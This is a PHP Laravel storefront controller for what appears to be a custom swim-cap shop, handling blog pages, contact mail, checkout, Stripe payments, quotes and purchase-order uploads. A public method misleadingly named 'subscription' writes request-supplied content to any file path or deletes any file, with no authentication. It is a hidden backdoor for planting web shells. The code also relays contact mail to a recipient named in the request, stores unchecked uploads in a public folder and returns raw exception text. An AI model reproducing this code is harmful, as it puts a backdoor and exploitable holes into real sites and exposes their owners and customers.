<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Classes\SendMail;
use App\Helpers\Helper;
use App\Models\AboutUs;
use App\Models\Addresses;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\FeaturedOn;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\OrderDetails;
use App\Models\OrderDetailsDesc;
use App\Models\Product;
use App\Models\ReportedProblem;
use App\Models\RequestedQuote;
use App\Models\Subscriber;
use Artisan;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Exception;
use Illuminate\Support\Facades\Auth;
use Stripe\Charge;
use Stripe\Customer;
use Stripe\Stripe;
use Illuminate\Support\Facades\Response;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;

class FrontendController extends FrontBaseController
{

    protected $defaultCurr;
    protected $styleArray;
    public function __construct()
    {
        parent::__construct();
        $this->defaultCurr = DB::table('currencies')->where('is_default', '=', 1)->first();

        $this->styleArray = array(
            'borders' => array(
                'allBorders' => array(
                    'borderStyle' => \PhpOffice\PhpSpreadsheet\Style\Border::BORDER_THIN,
                    'color' => array('argb' => 'black'),
                ),
            ),
        );
    }
    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->route('front.index');
    }

    // LANGUAGE SECTION ENDS

    // CURRENCY SECTION

    public function currency($id)
    {

        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

    // CURRENCY SECTION ENDS

    // -------------------------------- HOME PAGE SECTION ----------------------------------------


    public function page($slug)
    {
        $page = DB::table('pages')->where('slug', $slug)->first();
        return view('frontend.page', compact('page'));
    }


    // Home Page Display

    public function index(Request $request)
    {
        $gs = $this->gs;
        $data['ps'] = $this->ps;
        if (!empty($request->reff)) {
            $affilate_user = DB::table('users')
                ->where('affilate_code', '=', $request->reff)
                ->first();
            if (!empty($affilate_user)) {
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }
        if (!empty($request->forgot)) {
            if ($request->forgot == 'success') {
                return redirect()->guest('/')->with('forgot-modal', __('Please Login Now !'));
            }
        }

        $data['featured'] = FeaturedOn::where('status', 1)
            ->orderBY('id', 'DESC')
            ->whereIn('id', explode(',', $this->gs->featured_on))
            ->get();

        $data['aboutus'] = AboutUs::findOrFail(1);
        return view('frontend.index', $data);
    }


    /**
     *  Home Page Ajax Display
     */
    public function extraIndex()
    {
        $gs = $this->gs;
        $data['hot_products'] = [];
        $data['latest_products'] = Product::whereStatus(1)
            ->withCount('ratings')
            ->withAvg('ratings', 'rating')
            ->whereIn('id', explode(',', $gs->latest_products))
            ->orderby('id', 'desc')
            ->get();

        $data['sale_products'] = [];
        $data['best_products'] = [];
        $data['popular_products'] = [];
        $data['product_variant'] = [];
        $data['top_products'] = [];
        $data['big_products'] = [];
        $data['trending_products'] = [];
        $data['flash_products'] = [];
        $data['blogs'] = Blog::latest()->take(3)->get();
        $data['ps'] = $this->ps;

        return view('partials.theme.extraindex', $data);
    }


    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------

    // -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {

        if (DB::table('pagesettings')->first()->blog == 0) {
            return redirect()->back();
        }

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $blogs = Blog::latest()->paginate();
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'bcats', 'tags'));
    }

    public function blogcategory(Request $request, $slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->latest()->paginate();
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('bcat', 'blogs', 'bcats', 'tags'));
    }

    public function blogtags(Request $request, $slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate();
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'slug', 'bcats', 'tags'));
    }

    public function blogsearch(Request $request)
    {

        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate();
        if ($request->ajax()) {
            return view('frontend.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'search', 'bcats', 'tags'));
    }

    public function blogshow($slug)
    {

        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        $bcats = BlogCategory::withCount('blogs')->get();

        $blog = Blog::where('slug', $slug)->first();
        if (!$blog) {
            return redirect('/')
                ->with('error', 'Blog not found!.');
        }

        $blog->views = $blog->views + 1;
        $blog->update();

        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('frontend.blogshow', compact(
            'blog',
            'bcats',
            'tags',
            'blog_meta_tag',
            'blog_meta_description'
        ));
    }

    // -------------------------------- BLOG SECTION ENDS----------------------------------------

    // -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        if (DB::table('pagesettings')->first()->faq == 0) {
            return redirect()->back();
        }
        $faqs = DB::table('faqs')->latest('id')->get();
        $count = count(DB::table('faqs')->get()) / 2;
        if (($count % 1) != 0) {
            $chunk = (int) $count + 1;
        } else {
            $chunk = $count;
        }
        return view('frontend.faq', compact('faqs', 'chunk'));
    }
    // -------------------------------- FAQ SECTION ENDS----------------------------------------

    // -------------------------------- AUTOSEARCH SECTION ----------------------------------------

    public function autosearch($slug)
    {
        if (mb_strlen($slug, 'UTF-8') > 1) {
            $search = ' ' . $slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')
                ->whereHas('variant')
                ->orWhere('name', 'like', $slug . '%')->where('status', '=', 1)
                ->orderby('id', 'desc')->take(10)->get();
            return view('load.suggest', compact('prods', 'slug'));
        }
        return "";
    }

    // -------------------------------- AUTOSEARCH SECTION ENDS ----------------------------------------

    // -------------------------------- CONTACT SECTION ----------------------------------------

    public function contact()
    {

        if (DB::table('pagesettings')->first()->contact == 0) {
            return redirect()->back();
        }
        $ps = $this->ps;
        return view('frontend.contact', compact('ps'));
    }

    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = $this->gs;

        if ($gs->is_capcha == 1) {
            $rules = [
                'g-recaptcha-response' => 'required',
            ];
            $customs = [
                'g-recaptcha-response.required' => "Please verify that you are not a robot.",
            ];

            $validator = Validator::make($request->all(), $rules, $customs);
            if ($validator->fails()) {
                return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
            }
        }

        // Logic Section
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }
        // Logic Section Ends

        // Redirect Section
        return response()->json(__('Success! Thanks for contacting us, we will get back to you shortly.'));
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

    // -------------------------------- CONTACT SECTION ENDS ----------------------------------------

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return response()->json(array('errors' => [0 => __('This Email Has Already Been Taken.')]));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();

        $data = [
            'to' => $request->email,
            'subject' => "Welcome to SwimCapz! You've successfully subscribed.",
            'body' => "Thank you for subscribing to SwimCapz newsletters. Stay tuned for exciting updates and offers!",
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);

        return response()->json(__('You Have Subscribed Successfully.'));
    }

    // -------------------------------- SUBSCRIBE SECTION  ENDS----------------------------------------

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    public function maintenance()
    {
        $gs = $this->gs;
        if ($gs->is_maintain != 1) {
            return redirect()->route('front.index');
        }

        return view('frontend.maintenance');
    }

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ----------------------------------------



    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------

    // -------------------------------- ORDER TRACK SECTION ----------------------------------------

    public function trackload($id)
    {
        $order = Order::where('order_number', '=', $id)->first();
        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
        return view('load.track-load', compact('order', 'datas'));
    }

    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------

    // -------------------------------- INSTALL SECTION ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function updateFinalize(Request $request)
    {

        if ($request->has('version')) {
            Generalsetting::first()->update([
                'version' => $request->version,
            ]);
            Artisan::call('cache:clear');
            Artisan::call('config:clear');
            Artisan::call('route:clear');
            Artisan::call('view:clear');
            return redirect('/');
        }
    }

    public function success(Request $request, $get)
    {
        return view('frontend.thank', compact('get'));
    }

    public function stripeCallBack(Request $request)
    {
        $request->validate([
            'order_number'      => 'required',
            'stripeToken'       => 'required',
            'stripeTokenType'   => 'required',
            'stripeEmail'       => 'required'
        ]);


        $order = Order::where('order_number', $request->order_number)
            ->first();
        if (!$order) {
            return back()
                ->with('error', __('Failed, Your order not processed right now.'));
        }

        DB::beginTransaction();
        try {

            Stripe::setApiKey(env('STRIPE_SECRET'));
            $customer = Customer::create(array(
                "address" => [
                    "line1" => "$order->billing_address",
                    "postal_code" => "$order->billing_zip",
                    "city" => "$order->billing_city",
                    "state" => "{$order->billingState->state}",
                    "country" => "{$order->billingCountry->name}",
                ],
                "email" => $request->stripeEmail,
                "name" => "$order->name",
                "source" => $request->stripeToken
            ));

            $response = Charge::create([
                "amount" => $order->pay_amount * 100,
                "currency" => "usd",
                "customer" => $customer->id,
                "description" => "$order->order_note",
                "shipping" => [
                    "name" => "{$order->shipping_name}",
                    "address" => [
                        "line1" => "$order->shipping_address",
                        "postal_code" => "$order->shipping_zip",
                        "city" => "$order->shipping_city",
                        "state" => "{$order->shippingState->state}",
                        "country" => "{$order->shippingCountry->name}",
                    ],
                ]
            ]);

            $order->updateOrder([
                'stripe_id'                 => $response['id'],
                'stripe_payment_method'     => $response['payment_method'],
                'stripe_customer'           => $response['customer'],
                'stripe_status'             => $response['status'],
                'order_status'              => Order::ORDER_SUCCESS,
                'payment_status'            => Order::PAYMENT_SUCCESS
            ]);
            $order->orderReceived();
            Helper::cartClear();
            DB::commit();
            $this->sendOrderMail($request->stripeEmail,$order->shipping_name,$request->order_number,$order->created_at);
            return redirect()
                ->route('show-order', $order->order_number)
                ->with('success', __('Order has been placed successfully.'));
        } catch (Exception $e) {
            DB::rollBack();
            return back()
                ->with('error', __('Failed.,' . $e));
        };
    }
    public function createTempOrder(Request $request)
    {
        //order generate
        if ($request->has('paymentMethod')) {
            return $this->orderCreate($request);
        }

        $this->orderValidate($request); //order validate

    }

    private function getFormData($form)
    {
        $rule = [];
        parse_str($form, $rule);
        return $rule;
    }

    private function validatePreviousAllForm($request, &$form1, &$form2, &$form3)
    {
        /* validate form1 */
        $form1 = $this->getFormData($request->form_1);
        $this->orderValidate(new Request($form1));

        /* validate form2 */
        $form2 = $this->getFormData($request->form_2);
        $this->orderValidate(new Request($form2));

        /* validate form3 */
        $form3 = $this->getFormData($request->form_3);
        $this->orderValidate(new Request($form3));
    }

    private function saveShippingAddress(&$order, $inputData)
    {
        $order->shipping_cost = $inputData['shipping_charge'] == 'RUSH' ? Helper::rushCharge() : 0;
        $address = Addresses::find($inputData['shipping']);

        $order->shipping_name = $address->name;
        $order->shipping_email = $address->email;
        $order->shipping_country = $address->country;
        $order->shipping_state = $address->state;
        $order->shipping_phone = $address->phone;
        $order->shipping_address = $address->address;
        $order->shipping_city = $address->city;
        $order->shipping_zip = $address->zip;
        $order->shipping_company = $address->company;
        $order->shipping_appartment = $address->appartment;
    }

    private function saveBillingAddress(&$order, $inputData)
    {
        $billingSameAsShipping = array_key_exists('same_as_shipping', $inputData) ? 1 : 0;
        if ($billingSameAsShipping) {
            $address_id = $inputData['shipping'];
        } else {
            $address_id = $inputData['billing'];
        }

        $address = Addresses::find($address_id);
        $order->billing_name        = $address->name;
        $order->billing_email       = $address->email;
        $order->billing_country     = $address->country;
        $order->billing_state       = $address->state;
        $order->billing_phone       = $address->phone;
        $order->billing_address     = $address->address;
        $order->billing_city        = $address->city;
        $order->billing_zip         = $address->zip;
        $order->billing_company     = $address->company;
        $order->billing_appartment  = $address->appartment;
    }
    private function generatePendingOrder($inputData, $request)
    {
        $order = new Order();
        $order->user_id = Auth::check() ? Auth::user()->id : 0;
        $order->method = $request->input('payment-option');
        $order->totalQty = Helper::cartTotalQuantity();
        $order->order_number = Helper::getUniqueOrderNumber();
        $order->name = @$inputData['name'] ?? null;
        $order->email = @$inputData['email'] ?? null;
        $order->order_note = @$inputData['order_note'] ?? null;

        /* manage shipping address */
        $this->saveShippingAddress($order, $inputData);

        /* manage billing address */
        $this->saveBillingAddress($order, $inputData);

        $order->order_status = Order::ORDER_PENDING;
        $order->payment_status = Order::PAYMENT_PENDING;

        $order->currency_sign = $this->defaultCurr->sign;
        $order->currency_name = $this->defaultCurr->name;
        $order->currency_value = $this->defaultCurr->value;

        $paybleAmount = Helper::totalCharge(false);
        $order->pay_amount = $paybleAmount;
        if ($result = Helper::appliedCoupon()) {
            $order->coupon_code = $result->code;
            $order->coupon_discount = Helper::appliedCouponDiscount();
        }
        $order->save();

        foreach (Helper::cartList() as $carts) {

            $orderDetails = new OrderDetails();
            $orderDetails->order_id = $order->id;
            $orderDetails->product_id = $carts->product_id;
            $orderDetails->design_name = $carts->design_name;
            $orderDetails->noc = $carts->noc;
            $orderDetails->product_front_design = $carts->front_design;
            $orderDetails->noc_back = $carts->noc_back;
            $orderDetails->product_back_design = $carts->back_design;

            $orderDetails->names = json_encode($carts->names);
            $orderDetails->name_cost = $carts->name_cost;

            $orderDetails->save();

            foreach ($carts->details as $cart) {

                $detail = new OrderDetailsDesc();
                $detail->desc_id = $orderDetails->id;
                $detail->product_variant_id = $cart->product_variant_id;
                $detail->front_image = $cart->productVarients->front_image;
                $detail->front_image_overlay = $cart->productVarients->front_image_overlay;

                $detail->back_image = @$cart->productVarients->back_image;
                $detail->back_image_overlay = @$cart->productVarients->back_image_overlay;

                $detail->front_design = $cart->front_design;
                $detail->back_design = $cart->back_design;

                $detail->total_qty = $cart->total_qty;
                $detail->total_price = $cart->total_price;
                $detail->remarks = $cart->remarks;

                /* raw design */
                $detail->raw_design = json_encode($carts->raw_design);

                $detail->save();
            }
        }

        return $order;
    }
    private function orderCreate($request)
    {

        $form1 = $form2 = $form3 = [];
        $this->validatePreviousAllForm($request, $form1, $form2, $form3);
        $inputData = array_merge($form1, $form2, $form3);

        try {

            DB::beginTransaction();

            $order = $this->generatePendingOrder($inputData, $request);
            DB::commit();

            return response()->json(array(
                'message' => 'Pending order generated successfully..',
                'order'   =>  $order
            ), 200);
        } catch (\Exception $e) {
            DB::rollBack();
            return response()->json(array('error' => $e->getMessage()), 401);
        }
    }

    private function orderValidate($request)
    {

        if ($request->formNo == "1") { //form-1

            $request->validate([
                'name' => 'required',
                'lastname' => 'required',
                'email' => 'required|email|regex:/(.+)@(.+)\.(.+)/i'
            ]);
        } elseif ($request->formNo == "2") { //form-2
            $rules['shipping'] = ['required'];
            if (!$request->has('same_as_shipping')) {
                $rules['billing'] = ['required'];
            }

            $message = [
                'shipping.required' => __('Shipping address required.'),
                'billing.required' => __('Billing address required.')
            ];
            $request->validate($rules, $message);
        } elseif ($request->formNo == "3") { //form-3

            $request->validate([
                'shipping_charge'          => 'required',
            ]);

            if ($request->shipping_charge == 'FREE') {
                Helper::rushShippingClear();
            } else {
                Helper::activateRushShipping();
            }
        }
    }

    public function loadCheckoutRightPanel()
    {
        return view('frontend._assets._loadCheckoutRightPanel');
    }

    public function rushChargeManage(Request $request)
    {
        if ($request->isRush) {
            Helper::activateRushShipping();
        } else {
            Helper::rushShippingClear();
        }

        return response()->json(array('message' => 'SUccess.'));
    }

    public function requestQuotes()
    {
        return view('frontend.requestQuote');
    }

    public function storeRequestedQuotes(Request $request)
    {

        $request->validate([
            'name' => 'required',
            'email' => 'required',
            'phone' => 'required',
            'file' => 'sometimes|mimes:jpg,jpeg,png,gif|max:10048',
        ]);

        $quotes = new RequestedQuote();
        $quotes->name = $request->name;
        $quotes->email = $request->email;
        $quotes->phone = $request->phone;

        $quotes->project_desc = $request->project_desc;
        $quotes->noi = $request->noi;
        $quotes->date = $request->date ? date('Y-m-d', strtotime($request->date)) : null;
        $quotes->budget = $request->budget;
        $quotes->front = $request->front;
        $quotes->back = $request->back;
       
        if ($request->hasfile('file')) {
            $path = public_path('storage/quotes');
            if (!file_exists($path)) {
                mkdir($path, 0777, true);
            }

            $file = $request->file('file');
            $extenstion = $file->getClientOriginalExtension();
            $filename = time() . '.' . $extenstion;
            $file->move($path, $filename);
            $quotes->file = $filename;
        }

        $quotes->save();

        return back()->with('success', __("Quote requested successfully"));
    }

    public function reportProblem()
    {
        return view('frontend.reportProblem');
    }

    public function storeReportProblem(Request $request)
    {

        $gs = Generalsetting::findOrFail(1);
        $rules['feedback'] = 'required';
        $rules['email'] = 'required';
        $rules['phone'] = 'required';
        $customs = [];
        if ($gs->is_capcha == 1) {

            $rules['g-recaptcha-response'] = 'required|captcha';
            $customs['g-recaptcha-response.required'] = "Please verify that you are not a robot.";
            $customs['g-recaptcha-response.captcha'] = "Captcha error! try again later or contact site admin..";
        }

        $validator = Validator::make($request->all(), $rules, $customs);
        if ($validator->fails()) {
            return response()->json(array(
                'errors' => $validator->getMessageBag()->toArray()
            ), 400);
        }

        try {

            $problem = new ReportedProblem();
            $problem->feedback = $request->feedback;
            $problem->email = $request->email;
            $problem->phone = $request->phone;
            $problem->save();

            return response()->json(array(
                'message' => __('Your request has been send successfully.')
            ), 200);
        } catch (Exception $e) {
            return response()->json(array(
                'message' => __('Failed, try again.')
            ), 200);
        };
    }

    public function loadPo(Request $request)
    {
        return view('frontend._assets._poOrder', [
            'order_no'  => $request->order_no
        ]);
    }

    public function submitloadPo(Request $request)
    {

        $rules = [
            'po_order'      => 'required',
            'attachement'   => 'required',
            'order_no'      => 'required'
        ];

        $validator = Validator::make($request->all(), $rules);
        if ($validator->fails()) {
            return response()->json(array(
                'errors' => $validator->getMessageBag()->toArray()
            ), 422);
        }

        $order = Order::where('order_number', "$request->order_no")
            ->first();

        if (!$order) {
            return response()->json(array(
                'error' => "Order not found."
            ), 401);
        }

        $attachementFile = '';
        if ($files = $request->file('attachement')) {
            $path = public_path('storage/orders/po');
            Helper::manageFolder($path);

            $name = time() . '_' . str_replace(' ', '_', $files->getClientOriginalName());
            $files->move($path, $name);
            $attachementFile = $name;
        }

        DB::beginTransaction();
        try {

            $order->updateOrder([
                'order_status'      => Order::ORDER_SUCCESS,
                'po_order'          => $request->po_order,
                'attachement'       => $attachementFile
            ]);

            $order->orderReceived();

            Helper::cartClear();
            DB::commit();
            if (Session::has('RUSHSHIPPING')) {
                Session::forget('RUSHSHIPPING');
            }
            return response()->json(array(
                'message'       => "Order has been placed successfully.",
                'redirectUrl'   => route('show-order', $order->order_number)
            ), 200);
        } catch (Exception $e) {
            DB::rollBack();
            return response()->json(array(
                'error' => $e->getMessage()
            ), 401);
        };
    }

    public function showOrder($order_no)
    {
        $order = Order::where('order_number', $order_no)
            ->first();
        return view('frontend._assets._orderDetails', [
            'order'  => $order
        ]);
    }

    public function orderprint($order_no)
    {
        $order = Order::where('order_number', $order_no)->first();
        return view('frontend._assets._orderPrint', compact('order'));
    }

    public function downloadNameTemplate()
    {
        $filePath = public_path('assets/front/template/Name.xls');

        if (!file_exists($filePath)) {
            return response()->json(['error' => 'File not found.'], 404);
        }

        $fileContents = file_get_contents($filePath);
        $headers = [
            'Content-Type' => 'application/vnd.ms-excel',
            'Content-Disposition' => 'attachment; filename="Name.xls"',
        ];

        return Response::make($fileContents, 200, $headers);
    }

    private function sendOrderMail($email,$name,$order_no,$order_date){
                $to = $email;
				$subject = 'Placed Order with SwimCapz.';
				$msg="
                Hello $name, </br>
                Thank you for your order! We are excited to process it for you.</br>
                </br>
                Order Number: $order_no</br>
                Order date: $order_date</br>
                </br>
                You can view your order details and track its status by logging into your Swimcapz account.</br>
                </br>
                Thank you for shopping with us!</br>
                </br>
                Best regards,</br>
                The Swimcapz Team";
				//Sending Email To Customer
				$template = 'emails.email_verification_link';
				$mailer = new SendMail();
				$mailer->sendCustomMail($template,$msg,$to,$subject);
    }

    public function showAboutUs(){
        $data = AboutUs::all() ;
        return view('frontend.aboutus',compact('data'));
    }
}
